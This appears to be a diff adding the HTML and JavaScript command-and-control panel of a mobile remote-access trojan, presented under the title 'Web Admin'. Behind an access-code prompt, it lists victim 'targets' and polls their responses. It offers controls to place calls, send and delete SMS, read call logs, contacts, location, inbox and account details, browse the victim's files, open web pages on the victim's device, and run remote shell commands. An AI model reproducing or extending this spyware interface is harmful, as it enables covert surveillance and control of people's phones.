@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Web Admin</title>
+		<style type="text/css">
+			::-webkit-scrollbar {
+				width: 10px;
+			}
+			::-webkit-scrollbar-track {
+				background: black;
+			}
+			::-webkit-scrollbar-thumb {
+				background-color: darkgreen;
+				border: 2px solid #1a4b1a;
+			}
+			::-webkit-scrollbar-thumb:hover {
+				background-color: #0a1e0a;
+			}
+			html, body {
+				width: 100%;
+				height: 100%;
+				margin: 0;
+				padding: 0;
+				background-color: green;
+			}
+			body {
+				background-image: url(background.jpg);
+    			background-size: cover;
+			}
+			#targets, #console, #response, #mode1, #mode2, #explorer {
+				width: calc(32.9% - 10px);
+				height: calc(50% - 17px);
+				display: inline-block;
+				background-color: rgba(0,0,0,0.85);
+				border: 2px solid green;
+				padding: 5px;
+				overflow: auto;
+			}
+			#response, #console, #mode2, #explorer {
+				float: right;
+			}
+			#mode1 .content button {
+				border-radius: 0;
+				border: 2px solid green;
+				background-color: black;
+				color: green;
+				display: block;
+				width: 100%;
+				text-align: left;
+			}
+			#mode1 .content button:focus {
+				outline: none;
+			}
+			#codeInp {
+				border: 2px solid red;
+				background-color: rgba(10, 10, 10, 0.9);
+				color: red;
+				padding: 10px;
+				width: fit-content;
+				height: fit-content;
+				position: absolute;
+				top: 0;
+				bottom: 0;
+				left: 0;
+				right: 0;
+				margin: auto;
+				z-index: 1;
+			}
+			#actualDiaInp {
+				background-color: rgba(10, 10, 10, 10.9);
+				color: red;
+				border: 0;
+			}
+			#actualDiaInp:focus {
+				outline: none;
+			}
+			#explorer a {
+				font-size: large;
+			}
+			#explorer .explorer-child {
+				display: inline-block;
+				border: 2px solid green;
+				color: blue;
+				width: 77%;
+				text-decoration: none;
+			}
+			#explorer .explorer-item {
+				display: inline-block;
+				float: right;
+				border: 2px solid blue;
+				color: red;
+				width: 20%;
+				text-decoration: none;
+				text-align: center;
+			}
+			.target-item {
+				border: 2px solid green;
+				display: block;
+				padding: 5px;
+			}
+			.content {
+				display: none;
+			}
+			#mode2 input {
+				display: block;
+				width: calc(100% - 10px);
+				color: green;
+				border: 2px solid green;
+				background-color: black;
+				margin: 0;
+				padding: 5px;
+			}
+			#mode2 input:focus {
+				outline: none;
+			}
+			#mode2 button {
+				background-color: black;
+				border: 2px solid green;
+				color: green;
+				width: calc(100% - 10px);
+				padding: 5px;
+			}
+			#mode2 button:focus {
+				outline: none;
+			}
+			h1 {
+				font-weight: lighter;
+				font-family: monospace;
+				border: 1px dashed;
+			}
+			.btn-icon {
+			    float: right;
+			    border: 1px solid;
+			    font-family: monospace;
+			    font-size: xx-large;				
+			}
+		</style>
+		<script type="text/javascript" src="utilities.js"></script>
+		<script type="text/javascript">
+			let alertIn, alertOut, actDiaInp, target_con, mode1_con, mode2_con, console_con, appTarget, response_con, explorer_con;
+			let delay=5, called=0;
+			function appendDashes(elementE, n, delay) {
+				let timesT=0;
+				let main_timer=setInterval(()=>{
+					alertDia.append("-");
+					timesT++;
+					if(timesT==n) {
+						clearInterval(main_timer);
+						let newLine=document.createElement("br");
+						diaInp.setAttribute("onkeypress", "diaInpKeyPress(event)");
+						setTimeout(()=>{elementE.appendChild(newLine);}, delay);
+					}
+				}, delay);
+			}
+			function appendDash(elementE, n, delay) {
+				let timesT=0;
+				let main_timer=setInterval(()=>{
+					alertDia.append("-");
+					timesT++;
+					if(timesT==n) {
+						clearInterval(main_timer);
+						let newLine=document.createElement("br");
+						let diaInp=document.createElement("input");
+						diaInp.setAttribute("id", "actualDiaInp");
+						diaInp.setAttribute("onkeypress", "diaInpKeyPress(event)");
+						setTimeout(()=>{elementE.appendChild(newLine);}, delay);
+						setTimeout(()=>{elementE.append(">");}, delay);
+						setTimeout(()=>{elementE.appendChild(diaInp); diaInp.focus(); }, delay);
+					}
+				}, delay);
+			}
+			function diaInpKeyPress(event) {
+				if(event.key=="Enter") {
+					let accessCode=document.getElementById("actualDiaInp").value;
+					document.getElementById("actualDiaInp").value="";
+					alertOut=document.getElementById("codeInp");
+					alertIn=document.getElementById("diaInp");
+					alertIn.innerHTML="Waiting for Server Response..."
+					let request=new XMLHttpRequest();
+					request.onload=function() {
+						let response=this.responseText;
+						let requestParts=response.split("\n");
+						if(requestParts[0]=="Success") {
+							alertIn.innerHTML="<span style=\"color: GREEN; font-size: x-large;\">ACESS GRANTED</span>";
+							let myFunc=(event)=>{
+								window.removeEventListener("keypress", myFunc);
+								alertOut.style.display="none";
+							};
+							window.addEventListener("keypress", myFunc);
+							targets_con=document.getElementById("targets");
+							mode1_con=document.getElementById("mode1");
+							mode2_con=document.getElementById("mode2");
+							console_con=document.getElementById("console");
+							response_con=document.getElementById("response");
+							explorer_con=document.getElementById("explorer");
+							console_con.log=(text)=>{
+								let newLine=document.createElement("br");
+								console_con.append(text+"\n");
+								console_con.appendChild(newLine);
+								console_con.append("\n");
+								console_con.scrollTop=console_con.scrollHeight;
+							};
+							console_con.clear=()=>{
+								console_con.innerHTML="<h1>Console</h1>";
+							};
+							console_con.log("Access is Granted...");
+							console_con.log("Fetching Targets...");
+							let respJSON=JSON.parse(requestParts[1]);
+							console_con.log("Targets Found: "+respJSON.length);
+							for(let i=0;i<respJSON.length;i++) {								
+								let alink=document.createElement("a");
+								alink.setAttribute("href", "javascript:void(0)");
+								alink.setAttribute("class", "target-item");
+								alink.setAttribute("onclick", "selectTarget("+respJSON[i][0]+");");								
+								for(let n=0;n<respJSON[i].length;n++) {
+									alink.innerHTML+=respJSON[i][n]+"\n<br>\n";
+								}
+								targets_con.appendChild(alink);
+							}
+						}
+						else {
+							alertIn.innerHTML="<span style=\"color: RED; font-size: x-large;\">ACESS DENIED</span>\n<br>Re-enter access code<br>\n";
+							appendDash(alertIn, 40, 10);
+						}
+					};
+					request.open("POST", "listTargets.php", true);
+					request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+					request.send("accessCode="+accessCode);
+				}
+			}
+			function selectTarget(targ) {
+				console_con.log("Connecting to target with UID: "+targ);
+				target=targ;
+				if(called==0) {
+					called=1;
+					mode1_con.children[0].style.display="none";
+					mode1_con.children[1].style.display="block";
+					mode2_con.children[1].style.display="none";
+					mode2_con.children[2].style.display="block";
+					response_con.children[1].style.display="none";
+					response_con.children[2].style.display="block";
+					explorer_con.children[1].style.display="none";
+					explorer_con.children[2].style.display="block";
+					updateResponse();
+					updateExplorer();
+				}
+				currentDir="/";
+				dirs();
+				dumpResponse();
+			}
+			function updateResponse() {
+				let xhttp=new XMLHttpRequest();
+				xhttp.onload=function() {
+					document.getElementById("response").children[2].innerText=this.responseText;
+					setTimeout(updateResponse, delay*100);
+				}
+				xhttp.open("GET", "VictimResponses/"+target+".resp?time="+new Date().getTime(), true);
+				xhttp.send();
+			}
+			function updateExplorer() {
+				let xhttp=new XMLHttpRequest();
+				xhttp.onload=function() {
+					document.getElementById("explorer").children[2].innerHTML=this.responseText;
+					setTimeout(updateExplorer, delay*100);
+				}
+				xhttp.open("GET", "VictimResponses/"+target+"f.resp?time="+new Date().getTime(), true);
+				xhttp.send();
+			}
+		</script>
+	</head>
+	<body>
+		<div id="codeInp">
+			<p id="diaInp">
+				Please Enter Access Code
+				<br>
+				<script type="text/javascript">
+					let alertDia=document.getElementById("diaInp");
+					appendDash(alertDia, 40, 10);
+				</script>
+			</p>
+		</div>
+		<div id="targets" style="color: blue;">
+		</div>
+		<div id="response" style="color: white">
+			<h1>
+				Target's Response
+				<span class="btn-icon" onclick="dumpResponse()">D</span>
+				<span class="btn-icon" onclick="openInNewWindow()">N</span>
+			</h1>
+			<p class="before">
+				Target Not Connected
+			</p>
+			<p class="content">
+			</p>
+		</div>
+		<div id="console" style="color: green;">
+			<h1>
+				Console
+				<span class="btn-icon" onclick="console_con.clear();">C</span>
+			</h1>
+		</div>
+		<div id="mode1" style="color: red;">
+			<p class="before">
+				Target Not Connected
+			</p>
+			<p class="content">
+				<button onclick="call();">Call</button>
+				<button onclick="sendSMS();">Send Message</button>
+				<button onclick="callLog();">Call Log</button>
+				<button onclick="contacts()">Fetch Contacts</button>
+				<button onclick="getLocation()">Fetch Location</button>
+				<button onclick="getOperator()">Fetch Operator</button>
+				<button onclick="getPhoneNo()">Fetch Phone No.</button>
+				<button onclick="getMAC()">Fetch MAC Address</button>
+				<button onclick="inbox()">Inbox</button>
+				<button onclick="sentBox()">Sent Box</button>
+				<button onclick="deleteSMS()">Delete SMS</button>
+				<button onclick="getGmail()">Get Account</button>
+				<button onclick="dirD()">Arrange By Date</button>
+				<button onclick="promptVictim()">Show Prompt</button>
+				<button onclick="openVictimBrowser()">Open Webpage in Target's Device</button>
+				<button onclick="setDelay();">Alter Delay</button>
+			</p>
+		</div>
+		<div id="explorer" style="color: green;">
+			<h1>
+				File Explorer
+				<span class="btn-icon" onclick="dumpExplorer()">D</span>
+			</h1>
+			<p class="before">
+				Target Not Connected
+			</p>
+			<p class="content">
+			</p>
+		</div>
+		<div id="mode2" style="color: blue;">
+			<h1>Shell</h1>
+			<p class="before">
+				Target Not Connected
+			</p>
+			<p class="content" style="text-align: center;">
+				<input type="text" id="mode2Inp">
+				<br>
+				<button onclick="executeMode2();">Send Command</button>
+			</p>
+		</div>
+	</body>
+</html>
